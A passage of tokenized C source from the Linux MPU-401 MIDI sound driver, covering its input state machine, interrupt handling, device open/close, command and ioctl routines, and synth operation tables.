"default", ":", "if", "(", "midic", "<", "=", "0xef", ")", "{", "/", "*", "printk", "(", "\"", "mpu", "time", ":", "%", "d", "\"", ",", "midic", ")", ";", "*", "/", "devc", "-", ">", "m_state", "=", "ST_TIMED", ";", "}", "else", "printk", "(", "\"<", "MPU", ":", "Unknown", "event", "%", "02x", ">", "\"", ",", "midic", ")", ";", "}", "break", ";", "case", "ST_TIMED", ":", "{", "int", "msg", "=", "(", "(", "int", ")", "(", "midic", "&", "0xf0", ")", ">", ">", "4", ")", ";", "devc", "-", ">", "m_state", "=", "ST_DATABYTE", ";", "if", "(", "msg", "<", "8", ")", "/", "*", "Data", "byte", "*", "/", "{", "/", "*", "printk", "(", "\"", "midi", "msg", "(", "running", "status", ")", "\"", ");", "*", "/", "msg", "=", "(", "(", "int", ")", "(", "devc", "-", ">", "last_status", "&", "0xf0", ")", ">", ">", "4", ")", ";", "msg", "-", "=", "8", ";", "devc", "-", ">", "m_left", "=", "len_tab", "[", "msg", "]", "-", "1", ";", "devc", "-", ">", "m_ptr", "=", "2", ";", "devc", "-", ">", "m_buf", "[", "0", "]", "=", "devc", "-", ">", "last_status", ";", "devc", "-", ">", "m_buf", "[", "1", "]", "=", "midic", ";", "if", "(", "devc", "-", ">", "m_left", "<", "=", "0", ")", "{", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "do_midi_msg", "(", "devc", "-", ">", "synthno", ",", "devc", "-", ">", "m_buf", ",", "devc", "-", ">", "m_ptr", ")", ";", "devc", "-", ">", "m_ptr", "=", "0", ";", "}", "}", "else", "if", "(", "msg", "=", "=", "0xf", ")", "/", "*", "MPU", "MARK", "*", "/", "{", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "switch", "(", "midic", ")", "{", "case", "0xf8", ":", "/", "*", "printk", "(", "\"", "NOP", "\"", ");", "*", "/", "break", ";", "case", "0xf9", ":", "/", "*", "printk", "(", "\"", "meas", "end", "\"", ");", "*", "/", "break", ";", "case", "0xfc", ":", "/", "*", "printk", "(", "\"", "data", "end", "\"", ");", "*", "/", "break", ";", "default", ":", "printk", "(", "\"", "Unknown", "MPU", "mark", "%", "02x", "\\", "n", "\"", ",", "midic", ")", ";", "}", "}", "else", "{", "devc", "-", ">", "last_status", "=", "midic", ";", "/", "*", "printk", "(", "\"", "midi", "msg", "\"", ");", "*", "/", "msg", "-", "=", "8", ";", "devc", "-", ">", "m_left", "=", "len_tab", "[", "msg", "]", ";", "devc", "-", ">", "m_ptr", "=", "1", ";", "devc", "-", ">", "m_buf", "[", "0", "]", "=", "midic", ";", "if", "(", "devc", "-", ">", "m_left", "<", "=", "0", ")", "{", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "do_midi_msg", "(", "devc", "-", ">", "synthno", ",", "devc", "-", ">", "m_buf", ",", "devc", "-", ">", "m_ptr", ")", ";", "devc", "-", ">", "m_ptr", "=", "0", ";", "}", "}", "}", "break", ";", "case", "ST_SYSMSG", ":", "switch", "(", "midic", ")", "{", "case", "0xf0", ":", "printk", "(", "\"<", "SYX", ">", "\")", ";", "devc", "-", ">", "m_state", "=", "ST_SYSEX", ";", "break", ";", "case", "0xf1", ":", "devc", "-", ">", "m_state", "=", "ST_MTC", ";", "break", ";", "case", "0xf2", ":", "devc", "-", ">", "m_state", "=", "ST_SONGPOS", ";", "devc", "-", ">", "m_ptr", "=", "0", ";", "break", ";", "case", "0xf3", ":", "devc", "-", ">", "m_state", "=", "ST_SONGSEL", ";", "break", ";", "case", "0xf6", ":", "/", "*", "printk", "(", "\"", "tune_request", "\\", "n", "\"", ");", "*", "/", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "break", ";", "/", "*", "*", "Real", "time", "messages", "*", "/", "case", "0xf8", ":", "/", "*", "midi", "clock", "*", "/", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "timer_ext_event", "(", "devc", ",", "TMR_CLOCK", ",", "0", ")", ";", "break", ";", "case", "0xfA", ":", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "timer_ext_event", "(", "devc", ",", "TMR_START", ",", "0", ")", ";", "break", ";", "case", "0xFB", ":", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "timer_ext_event", "(", "devc", ",", "TMR_CONTINUE", ",", "0", ")", ";", "break", ";", "case", "0xFC", ":", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "timer_ext_event", "(", "devc", ",", "TMR_STOP", ",", "0", ")", ";", "break", ";", "case", "0xFE", ":", "/", "*", "active", "sensing", "*", "/", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "break", ";", "case", "0xff", ":", "/", "*", "printk", "(", "\"", "midi", "hard", "reset", "\"", ");", "*", "/", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "break", ";", "default", ":", "printk", "(", "\"", "unknown", "MIDI", "sysmsg", "%", "0x", "\\", "n", "\"", ",", "midic", ")", ";", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "}", "break", ";", "case", "ST_MTC", ":", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "printk", "(", "\"", "MTC", "frame", "%", "x02", "\\", "n", "\"", ",", "midic", ")", ";", "break", ";", "case", "ST_SYSEX", ":", "if", "(", "midic", "=", "=", "0xf7", ")", "{", "printk", "(", "\"<", "EOX", ">", "\")", ";", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "}", "else", "printk", "(", "\"%", "02x", "\"", ",", "midic", ")", ";", "break", ";", "case", "ST_SONGPOS", ":", "BUFTEST", "(", "devc", ")", ";", "devc", "-", ">", "m_buf", "[", "devc", "-", ">", "m_ptr", "+", "+]", "=", "midic", ";", "if", "(", "devc", "-", ">", "m_ptr", "=", "=", "2", ")", "{", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "devc", "-", ">", "m_ptr", "=", "0", ";", "timer_ext_event", "(", "devc", ",", "TMR_SPP", ",", "(", "(", "devc", "-", ">", "m_buf", "[", "1", "]", "&", "0x7f", ")", "<", "<", "7", ")", "|", "(", "devc", "-", ">", "m_buf", "[", "0", "]", "&", "0x7f", ")", ");", "}", "break", ";", "case", "ST_DATABYTE", ":", "BUFTEST", "(", "devc", ")", ";", "devc", "-", ">", "m_buf", "[", "devc", "-", ">", "m_ptr", "+", "+]", "=", "midic", ";", "if", "(", "(-", "-", "devc", "-", ">", "m_left", ")", "<", "=", "0", ")", "{", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "do_midi_msg", "(", "devc", "-", ">", "synthno", ",", "devc", "-", ">", "m_buf", ",", "devc", "-", ">", "m_ptr", ")", ";", "devc", "-", ">", "m_ptr", "=", "0", ";", "}", "break", ";", "default", ":", "printk", "(", "\"", "Bad", "state", "%", "d", "\"", ",", "devc", "-", ">", "m_state", ")", ";", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "}", "return", "1", ";", "}", "static", "void", "mpu401_input_loop", "(", "struct", "mpu_config", "*", "devc", ")", "{", "unsigned", "long", "flags", ";", "int", "busy", ";", "int", "n", ";", "spin_lock_irqsave", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "busy", "=", "devc", "-", ">", "m_busy", ";", "devc", "-", ">", "m_busy", "=", "1", ";", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "busy", ")", "/", "*", "Already", "inside", "the", "scanner", "*", "/", "return", ";", "n", "=", "50", ";", "while", "(", "input_avail", "(", "devc", ")", "&", "&", "n", "-", "-", ">", "0", ")", "{", "unsigned", "char", "c", "=", "read_data", "(", "devc", ")", ";", "if", "(", "devc", "-", ">", "mode", "=", "=", "MODE_SYNTH", ")", "{", "mpu_input_scanner", "(", "devc", ",", "c", ")", ";", "}", "else", "if", "(", "devc", "-", ">", "opened", "&", "OPEN_READ", "&", "&", "devc", "-", ">", "inputintr", "!", "=", "NULL", ")", "devc", "-", ">", "inputintr", "(", "devc", "-", ">", "devno", ",", "c", ")", ";", "}", "devc", "-", ">", "m_busy", "=", "0", ";", "}", "static", "irqreturn_t", "mpuintr", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "mpu_config", "*", "devc", ";", "int", "dev", "=", "(", "int", ")", "(", "unsigned", "long", ")", "dev_id", ";", "int", "handled", "=", "0", ";", "devc", "=", "&", "dev_conf", "[", "dev", "]", ";", "if", "(", "input_avail", "(", "devc", ")", ")", "{", "handled", "=", "1", ";", "if", "(", "devc", "-", ">", "base", "!", "=", "0", "&", "&", "(", "devc", "-", ">", "opened", "&", "OPEN_READ", "|", "|", "devc", "-", ">", "mode", "=", "=", "MODE_SYNTH", ")", ")", "mpu401_input_loop", "(", "devc", ")", ";", "else", "{", "/", "*", "Dummy", "read", "(", "just", "to", "acknowledge", "the", "interrupt", ")", "*", "/", "read_data", "(", "devc", ")", ";", "}", "}", "return", "IRQ_RETVAL", "(", "handled", ")", ";", "}", "static", "int", "mpu401_open", "(", "int", "dev", ",", "int", "mode", ",", "void", "(", "*", "input", ")", "(", "int", "dev", ",", "unsigned", "char", "data", ")", ",", "void", "(", "*", "output", ")", "(", "int", "dev", ")", ")", "{", "int", "err", ";", "struct", "mpu_config", "*", "devc", ";", "struct", "coproc_operations", "*", "coprocessor", ";", "if", "(", "dev", "<", "0", "|", "|", "dev", ">", "=", "num_midis", "|", "|", "midi_devs", "[", "dev", "]", "=", "=", "NULL", ")", "return", "-", "ENXIO", ";", "devc", "=", "&", "dev_conf", "[", "dev", "]", ";", "if", "(", "devc", "-", ">", "opened", ")", "return", "-", "EBUSY", ";", "/", "*", "*", "Verify", "that", "the", "device", "is", "really", "running", ".", "*", "Some", "devices", "(", "such", "as", "Ensoniq", "SoundScape", "don", "'", "t", "*", "work", "before", "the", "on", "board", "processor", "(", "OBP", ")", "is", "initialized", "*", "by", "downloading", "its", "microcode", ".", "*", "/", "if", "(", "!", "devc", "-", ">", "initialized", ")", "{", "if", "(", "mpu401_status", "(", "devc", ")", "=", "=", "0xff", ")", "/", "*", "Bus", "float", "*", "/", "{", "printk", "(", "KERN_ERR", "\"", "mpu401", ":", "Device", "not", "initialized", "properly", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "reset_mpu401", "(", "devc", ")", ";", "}", "if", "(", "(", "coprocessor", "=", "midi_devs", "[", "dev", "]", "->", "coproc", ")", "!", "=", "NULL", ")", "{", "if", "(", "!", "try_module_get", "(", "coprocessor", "-", ">", "owner", ")", ")", "{", "mpu401_close", "(", "dev", ")", ";", "return", "-", "ENODEV", ";", "}", "if", "(", "(", "err", "=", "coprocessor", "-", ">", "open", "(", "coprocessor", "-", ">", "devc", ",", "COPR_MIDI", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "MPU", "-", "401", ":", "Can", "'", "t", "access", "coprocessor", "device", "\\", "n", "\"", ");", "mpu401_close", "(", "dev", ")", ";", "return", "err", ";", "}", "}", "set_uart_mode", "(", "dev", ",", "devc", ",", "1", ")", ";", "devc", "-", ">", "mode", "=", "MODE_MIDI", ";", "devc", "-", ">", "synthno", "=", "0", ";", "mpu401_input_loop", "(", "devc", ")", ";", "devc", "-", ">", "inputintr", "=", "input", ";", "devc", "-", ">", "opened", "=", "mode", ";", "return", "0", ";", "}", "static", "void", "mpu401_close", "(", "int", "dev", ")", "{", "struct", "mpu_config", "*", "devc", ";", "struct", "coproc_operations", "*", "coprocessor", ";", "devc", "=", "&", "dev_conf", "[", "dev", "]", ";", "if", "(", "devc", "-", ">", "uart_mode", ")", "reset_mpu401", "(", "devc", ")", ";", "/", "*", "*", "This", "disables", "the", "UART", "mode", "*", "/", "devc", "-", ">", "mode", "=", "0", ";", "devc", "-", ">", "inputintr", "=", "NULL", ";", "coprocessor", "=", "midi_devs", "[", "dev", "]", "->", "coproc", ";", "if", "(", "coprocessor", ")", "{", "coprocessor", "-", ">", "close", "(", "coprocessor", "-", ">", "devc", ",", "COPR_MIDI", ")", ";", "module_put", "(", "coprocessor", "-", ">", "owner", ")", ";", "}", "devc", "-", ">", "opened", "=", "0", ";", "}", "static", "int", "mpu401_out", "(", "int", "dev", ",", "unsigned", "char", "midi_byte", ")", "{", "int", "timeout", ";", "unsigned", "long", "flags", ";", "struct", "mpu_config", "*", "devc", ";", "devc", "=", "&", "dev_conf", "[", "dev", "]", ";", "/", "*", "*", "Sometimes", "it", "takes", "about", "30000", "loops", "before", "the", "output", "becomes", "ready", "*", "(", "After", "reset", ")", ".", "Normally", "it", "takes", "just", "about", "10", "loops", ".", "*", "/", "for", "(", "timeout", "=", "30000", ";", "timeout", ">", "0", "&", "&", "!", "output_ready", "(", "devc", ")", ";", "timeout", "-", "-)", ";", "spin_lock_irqsave", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "!", "output_ready", "(", "devc", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Send", "data", "timeout", "\\", "n", "\"", ");", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "write_data", "(", "devc", ",", "midi_byte", ")", ";", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "return", "1", ";", "}", "static", "int", "mpu401_command", "(", "int", "dev", ",", "mpu_command_rec", "*", "cmd", ")", "{", "int", "i", ",", "timeout", ",", "ok", ";", "unsigned", "long", "flags", ";", "struct", "mpu_config", "*", "devc", ";", "devc", "=", "&", "dev_conf", "[", "dev", "]", ";", "if", "(", "devc", "-", ">", "uart_mode", ")", "/", "*", "*", "Not", "possible", "in", "UART", "mode", "*", "/", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "commands", "not", "possible", "in", "the", "UART", "mode", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "/", "*", "*", "Test", "for", "input", "since", "pending", "input", "seems", "to", "block", "the", "output", ".", "*", "/", "if", "(", "input_avail", "(", "devc", ")", ")", "mpu401_input_loop", "(", "devc", ")", ";", "/", "*", "*", "Sometimes", "it", "takes", "about", "50000", "loops", "before", "the", "output", "becomes", "ready", "*", "(", "After", "reset", ")", ".", "Normally", "it", "takes", "just", "about", "10", "loops", ".", "*", "/", "timeout", "=", "50000", ";", "retry", ":", "if", "(", "timeout", "-", "-", "<", "=", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Command", "(", "0x", "%", "x", ")", "timeout", "\\", "n", "\"", ",", "(", "int", ")", "cmd", "-", ">", "cmd", ")", ";", "return", "-", "EIO", ";", "}", "spin_lock_irqsave", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "!", "output_ready", "(", "devc", ")", ")", "{", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "goto", "retry", ";", "}", "write_command", "(", "devc", ",", "cmd", "-", ">", "cmd", ")", ";", "ok", "=", "0", ";", "for", "(", "timeout", "=", "50000", ";", "timeout", ">", "0", "&", "&", "!", "ok", ";", "timeout", "-", "-)", "{", "if", "(", "input_avail", "(", "devc", ")", ")", "{", "if", "(", "devc", "-", ">", "opened", "&", "&", "devc", "-", ">", "mode", "=", "=", "MODE_SYNTH", ")", "{", "if", "(", "mpu_input_scanner", "(", "devc", ",", "read_data", "(", "devc", ")", ")", "=", "=", "MPU_ACK", ")", "ok", "=", "1", ";", "}", "else", "{", "/", "*", "Device", "is", "not", "currently", "open", ".", "Use", "simpler", "method", "*", "/", "if", "(", "read_data", "(", "devc", ")", "=", "=", "MPU_ACK", ")", "ok", "=", "1", ";", "}", "}", "}", "if", "(", "!", "ok", ")", "{", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "return", "-", "EIO", ";", "}", "if", "(", "cmd", "-", ">", "nr_args", ")", "{", "for", "(", "i", "=", "0", ";", "i", "<", "cmd", "-", ">", "nr_args", ";", "i", "+", "+)", "{", "for", "(", "timeout", "=", "3000", ";", "timeout", ">", "0", "&", "&", "!", "output_ready", "(", "devc", ")", ";", "timeout", "-", "-)", ";", "if", "(", "!", "mpu401_out", "(", "dev", ",", "cmd", "-", ">", "data", "[", "i", "]", "))", "{", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Command", "(", "0x", "%", "x", ")", ",", "parm", "send", "failed", ".", "\\", "n", "\"", ",", "(", "int", ")", "cmd", "-", ">", "cmd", ")", ";", "return", "-", "EIO", ";", "}", "}", "}", "cmd", "-", ">", "data", "[", "0", "]", "=", "0", ";", "if", "(", "cmd", "-", ">", "nr_returns", ")", "{", "for", "(", "i", "=", "0", ";", "i", "<", "cmd", "-", ">", "nr_returns", ";", "i", "+", "+)", "{", "ok", "=", "0", ";", "for", "(", "timeout", "=", "5000", ";", "timeout", ">", "0", "&", "&", "!", "ok", ";", "timeout", "-", "-)", "if", "(", "input_avail", "(", "devc", ")", ")", "{", "cmd", "-", ">", "data", "[", "i", "]", "=", "read_data", "(", "devc", ")", ";", "ok", "=", "1", ";", "}", "if", "(", "!", "ok", ")", "{", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "return", "-", "EIO", ";", "}", "}", "}", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "static", "int", "mpu_cmd", "(", "int", "dev", ",", "int", "cmd", ",", "int", "data", ")", "{", "int", "ret", ";", "static", "mpu_command_rec", "rec", ";", "rec", ".", "cmd", "=", "cmd", "&", "0xff", ";", "rec", ".", "nr_args", "=", "(", "(", "cmd", "&", "0xf0", ")", "=", "=", "0xE0", ")", ";", "rec", ".", "nr_returns", "=", "(", "(", "cmd", "&", "0xf0", ")", "=", "=", "0xA0", ")", ";", "rec", ".", "data", "[", "0", "]", "=", "data", "&", "0xff", ";", "if", "(", "(", "ret", "=", "mpu401_command", "(", "dev", ",", "&", "rec", ")", ")", "<", "0", ")", "return", "ret", ";", "return", "(", "unsigned", "char", ")", "rec", ".", "data", "[", "0", "]", ";", "}", "static", "int", "mpu401_prefix_cmd", "(", "int", "dev", ",", "unsigned", "char", "status", ")", "{", "struct", "mpu_config", "*", "devc", "=", "&", "dev_conf", "[", "dev", "]", ";", "if", "(", "devc", "-", ">", "uart_mode", ")", "return", "1", ";", "if", "(", "status", "<", "0xf0", ")", "{", "if", "(", "mpu_cmd", "(", "dev", ",", "0xD0", ",", "0", ")", "<", "0", ")", "return", "0", ";", "return", "1", ";", "}", "switch", "(", "status", ")", "{", "case", "0xF0", ":", "if", "(", "mpu_cmd", "(", "dev", ",", "0xDF", ",", "0", ")", "<", "0", ")", "return", "0", ";", "return", "1", ";", "default", ":", "return", "0", ";", "}", "}", "static", "int", "mpu401_start_read", "(", "int", "dev", ")", "{", "return", "0", ";", "}", "static", "int", "mpu401_end_read", "(", "int", "dev", ")", "{", "return", "0", ";", "}", "static", "int", "mpu401_ioctl", "(", "int", "dev", ",", "unsigned", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "struct", "mpu_config", "*", "devc", ";", "mpu_command_rec", "rec", ";", "int", "val", ",", "ret", ";", "devc", "=", "&", "dev_conf", "[", "dev", "]", ";", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_MIDI_MPUMODE", ":", "if", "(", "!(", "devc", "-", ">", "capabilities", "&", "MPU_CAP_INTLG", ")", ")", "{", "/", "*", "No", "intelligent", "mode", "*", "/", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Intelligent", "mode", "not", "supported", "by", "the", "HW", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "if", "(", "get_user", "(", "val", ",", "(", "int", "__user", "*", ")", "arg", ")", ")", "return", "-", "EFAULT", ";", "set_uart_mode", "(", "dev", ",", "devc", ",", "!", "val", ")", ";", "return", "0", ";", "case", "SNDCTL_MIDI_MPUCMD", ":", "if", "(", "copy_from_user", "(", "&", "rec", ",", "arg", ",", "sizeof", "(", "rec", ")", "))", "return", "-", "EFAULT", ";", "if", "(", "(", "ret", "=", "mpu401_command", "(", "dev", ",", "&", "rec", ")", ")", "<", "0", ")", "return", "ret", ";", "if", "(", "copy_to_user", "(", "arg", ",", "&", "rec", ",", "sizeof", "(", "rec", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "default", ":", "return", "-", "EINVAL", ";", "}", "}", "static", "void", "mpu401_kick", "(", "int", "dev", ")", "{", "}", "static", "int", "mpu401_buffer_status", "(", "int", "dev", ")", "{", "return", "0", ";", "/", "*", "*", "No", "data", "in", "buffers", "*", "/", "}", "static", "int", "mpu_synth_ioctl", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "int", "midi_dev", ";", "struct", "mpu_config", "*", "devc", ";", "midi_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "if", "(", "midi_dev", "<", "0", "|", "|", "midi_dev", ">", "=", "num_midis", "|", "|", "midi_devs", "[", "midi_dev", "]", "=", "=", "NULL", ")", "return", "-", "ENXIO", ";", "devc", "=", "&", "dev_conf", "[", "midi_dev", "]", ";", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_SYNTH_INFO", ":", "if", "(", "copy_to_user", "(", "arg", ",", "&", "mpu_synth_info", "[", "midi_dev", "]", ",", "sizeof", "(", "struct", "synth_info", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_SYNTH_MEMAVL", ":", "return", "0x7fffffff", ";", "default", ":", "return", "-", "EINVAL", ";", "}", "}", "static", "int", "mpu_synth_open", "(", "int", "dev", ",", "int", "mode", ")", "{", "int", "midi_dev", ",", "err", ";", "struct", "mpu_config", "*", "devc", ";", "struct", "coproc_operations", "*", "coprocessor", ";", "midi_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "if", "(", "midi_dev", "<", "0", "|", "|", "midi_dev", ">", "num_midis", "|", "|", "midi_devs", "[", "midi_dev", "]", "=", "=", "NULL", ")", "return", "-", "ENXIO", ";", "devc", "=", "&", "dev_conf", "[", "midi_dev", "]", ";", "/", "*", "*", "Verify", "that", "the", "device", "is", "really", "running", ".", "*", "Some", "devices", "(", "such", "as", "Ensoniq", "SoundScape", "don", "'", "t", "*", "work", "before", "the", "on", "board", "processor", "(", "OBP", ")", "is", "initialized", "*", "by", "downloading", "its", "microcode", ".", "*", "/", "if", "(", "!", "devc", "-", ">", "initialized", ")", "{", "if", "(", "mpu401_status", "(", "devc", ")", "=", "=", "0xff", ")", "/", "*", "Bus", "float", "*", "/", "{", "printk", "(", "KERN_ERR", "\"", "mpu401", ":", "Device", "not", "initialized", "properly", "\\", "n", "\"", ");", "return", "-", "EIO", ";", "}", "reset_mpu401", "(", "devc", ")", ";", "}", "if", "(", "devc", "-", ">", "opened", ")", "return", "-", "EBUSY", ";", "devc", "-", ">", "mode", "=", "MODE_SYNTH", ";", "devc", "-", ">", "synthno", "=", "dev", ";", "devc", "-", ">", "inputintr", "=", "NULL", ";", "coprocessor", "=", "midi_devs", "[", "midi_dev", "]", "->", "coproc", ";", "if", "(", "coprocessor", ")", "{", "if", "(", "!", "try_module_get", "(", "coprocessor", "-", ">", "owner", ")", ")", "return", "-", "ENODEV", ";", "if", "(", "(", "err", "=", "coprocessor", "-", ">", "open", "(", "coprocessor", "-", ">", "devc", ",", "COPR_MIDI", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Can", "'", "t", "access", "coprocessor", "device", "\\", "n", "\"", ");", "return", "err", ";", "}", "}", "devc", "-", ">", "opened", "=", "mode", ";", "reset_mpu401", "(", "devc", ")", ";", "if", "(", "mode", "&", "OPEN_READ", ")", "{", "mpu_cmd", "(", "midi_dev", ",", "0x8B", ",", "0", ")", ";", "/", "*", "Enable", "data", "in", "stop", "mode", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x34", ",", "0", ")", ";", "/", "*", "Return", "timing", "bytes", "in", "stop", "mode", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x87", ",", "0", ")", ";", "/", "*", "Enable", "pitch", "&", "controller", "*", "/", "}", "return", "0", ";", "}", "static", "void", "mpu_synth_close", "(", "int", "dev", ")", "{", "int", "midi_dev", ";", "struct", "mpu_config", "*", "devc", ";", "struct", "coproc_operations", "*", "coprocessor", ";", "midi_dev", "=", "synth_devs", "[", "dev", "]", "->", "midi_dev", ";", "devc", "=", "&", "dev_conf", "[", "midi_dev", "]", ";", "mpu_cmd", "(", "midi_dev", ",", "0x15", ",", "0", ")", ";", "/", "*", "Stop", "recording", ",", "playback", "and", "MIDI", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x8a", ",", "0", ")", ";", "/", "*", "Disable", "data", "in", "stopped", "mode", "*", "/", "devc", "-", ">", "inputintr", "=", "NULL", ";", "coprocessor", "=", "midi_devs", "[", "midi_dev", "]", "->", "coproc", ";", "if", "(", "coprocessor", ")", "{", "coprocessor", "-", ">", "close", "(", "coprocessor", "-", ">", "devc", ",", "COPR_MIDI", ")", ";", "module_put", "(", "coprocessor", "-", ">", "owner", ")", ";", "}", "devc", "-", ">", "opened", "=", "0", ";", "devc", "-", ">", "mode", "=", "0", ";", "}", "#", "define", "MIDI_SYNTH_NAME", "\"", "MPU", "-", "401", "UART", "Midi", "\"", "#", "define", "MIDI_SYNTH_CAPS", "SYNTH_CAP_INPUT", "#", "include", "\"", "midi_synth", ".", "h", "\"", "static", "struct", "synth_operations", "mpu401_synth_proto", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "id", "=", "\"", "MPU401", "\"", ",", ".", "info", "=", "NULL", ",", ".", "midi_dev", "=", "0", ",", ".", "synth_type", "=", "SYNTH_TYPE_MIDI", ",", ".", "synth_subtype", "=", "0", ",", ".", "open", "=", "mpu_synth_open", ",", ".", "close", "=", "mpu_synth_close", ",", ".", "ioctl", "=", "mpu_synth_ioctl", ",", ".", "kill_note", "=", "midi_synth_kill_note", ",", ".", "start_note", "=", "midi_synth_start_note", ",", ".", "set_instr", "=", "midi_synth_set_instr", ",", ".", "reset", "=", "midi_synth_reset", ",", ".", "hw_control", "=", "midi_synth_hw_control", ",", ".", "load_patch", "=", "midi_synth_load_patch", ",", ".", "aftertouch", "=", "midi_synth_aftertouch", ",", ".", "controller", "=", "midi_synth_controller", ",", ".", "panning", "=", "midi_synth_panning", ",", ".", "bender", "=", "midi_synth_bender", ",", ".", "setup_voice", "=", "midi_synth_setup_voice", ",", ".", "send_sysex", "=", "midi_synth_send_sysex", "}", ";", "static", "struct", "synth_operations", "*", "mpu401_synth_operations", "[", "MAX_MIDI_DEV", "]", ";", "static", "struct", "midi_operations", "mpu401_midi_proto", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "info", "=", "{", "\"", "MPU", "-", "401", "Midi", "\"", ",", "0", ",", "MIDI_CAP_MPU401", ",", "SNDCARD_MPU401", "}", ",", ".", "in_info", "=", "{", "0", "}", ",", ".", "open", "=", "mpu401_open", ",", ".", "close", "=", "mpu401_close", ",", ".", "ioctl", "=", "mpu401_ioctl", ",", ".", "outputc", "=", "mpu401_out", ",", ".", "start_read", "=", "mpu401_start_read", ",", ".", "end_read", "=", "mpu401_end_read", ",", ".", "kick", "=", "mpu401_kick", ",", ".", "buffer_status", "=", "mpu401_buffer_status", ",", ".", "prefix_cmd", "=", "mpu401_prefix_cmd", "}", ";", "static", "struct", "midi_operations", "mpu401_midi_operations", "[", "MAX_MIDI_DEV", "]", ";", "static", "void", "mpu401_chk_version", "(", "int", "n", ",", "struct", "mpu_config", "*", "devc", ")", "{", "int", "tmp", ";", "devc", "-", ">", "version", "=", "devc", "-", ">", "revision", "=", "0", ";", "tmp", "=", "mpu_cmd", "(", "n", ",", "0xAC", ",", "0", ")", ";", "if", "(", "tmp", "<", "0", ")", "return", ";", "if", "(", "(", "tmp", "&", "0xf0", ")", ">", "0x20", ")", "/", "*", "Why", "it", "'", "s", "larger", "than", "2", ".", "x", "?", "??", "*", "/", "return", ";", "devc", "-", ">", "version", "=", "tmp", ";", "if", "(", "(", "tmp", "=", "mpu_cmd", "(", "n", ",", "0xAD", ",", "0", ")", ")", "<", "0", ")", "{", "devc", "-", ">", "version", "=", "0", ";", "return", ";", "}", "devc", "-", ">", "revision", "=", "tmp", ";", "}", "int", "attach_mpu401", "(", "struct", "address_info", "*", "hw_config", ",", "struct", "module", "*", "owner", ")", "{", "unsigned", "long", "flags", ";", "char", "revision_char", ";", "int", "m", ",", "ret", ";", "struct", "mpu_config", "*", "devc", ";", "hw_config", "-", ">", "slots", "[", "1", "]", "=", "-", "1", ";", "m", "=", "sound_alloc_mididev", "(", ");", "if", "(", "m", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_WARNING", "\"", "MPU", "-", "401", ":", "Too", "many", "midi", "devices", "detected", "\\", "n", "\"", ");", "ret", "=", "-", "ENOMEM", ";", "goto", "out_err", ";", "}", "devc", "=", "&", "dev_conf", "[", "m", "]", ";", "devc", "-", ">", "base", "=", "hw_config", "-", ">", "io_base", ";", "devc", "-", ">", "osp", "=", "hw_config", "-", ">", "osp", ";", "devc", "-", ">", "irq", "=", "hw_config", "-", ">", "irq", ";", "devc", "-", ">", "opened", "=", "0", ";", "devc", "-", ">", "uart_mode", "=", "0", ";", "devc", "-", ">", "initialized", "=", "0", ";", "devc", "-", ">", "version", "=", "0", ";", "devc", "-", ">", "revision", "=", "0", ";", "devc", "-", ">", "capabilities", "=", "0", ";", "devc", "-", ">", "timer_flag", "=", "0", ";", "devc", "-", ">", "m_busy", "=", "0", ";", "devc", "-", ">", "m_state", "=", 